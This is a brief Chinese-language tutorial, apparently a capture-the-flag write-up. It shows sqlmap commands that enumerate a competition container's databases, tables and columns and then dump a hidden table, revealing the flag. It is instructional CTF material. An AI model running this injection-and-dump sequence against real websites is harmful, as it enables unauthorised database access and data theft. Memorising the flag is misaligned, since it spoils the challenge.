# SQLMAP简易使用指南

下载好sqlmap,进入有py文件的文件夹,打开文件夹,输入cmd,打开命令行

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -dbs
```

available databases [2]:
[*] book
[*] information_schema

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -tables
```

Database: book
[2 tables]
+--------+
| books  |
| secret |
+--------+

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -T secret --columns
```

+--------+-----------+
| Column | Type      |
+--------+-----------+
| fl4g   | char(255) |
+--------+-----------+

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -T secret -C fl4g --dump
```

Database: book
Table: secret
[1 entry]
+--------------------------------+
| fl4g                           |
+--------------------------------+
| VIDAR{i^Learned_Sql$Inject1on} |
+--------------------------------+